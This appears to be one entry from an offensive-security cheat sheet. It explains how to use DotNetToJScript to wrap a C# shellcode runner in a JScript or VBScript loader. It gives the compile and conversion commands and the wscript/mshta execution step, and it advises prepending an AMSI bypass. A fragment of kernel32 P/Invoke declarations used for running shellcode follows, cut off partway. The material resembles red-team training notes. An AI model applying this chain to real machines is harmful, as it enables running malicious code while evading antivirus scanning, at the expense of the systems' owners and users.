# 03.01 DotNetToJScript

> Listing 148/150 · [ComVisible], shellcode in constructor

## Overview

James Forshaw's DotNetToJScript serializes a .NET assembly as base64 into a JScript/VBScript that deserializes and instantiates it in-process. The C# class must have [ComVisible(true)] and the shellcode runner goes in the constructor (the ctor fires on CreateInstance). Chain with the JScript AMSI bypass block above.

## Steps

- **Write C# class** — `[ComVisible(true)]`, shellcode runner in the public constructor.
- **Compile to DLL** — `csc /target:library /out:ExampleAssembly.dll ExampleAssembly.cs`.
- **Run DotNetToJScript** — `DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js`.
- **Prepend AMSI bypass** — add the registry-key bypass block at the top of demo.js.
- **Execute** — `wscript demo.js` or `mshta demo.hta`.

        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
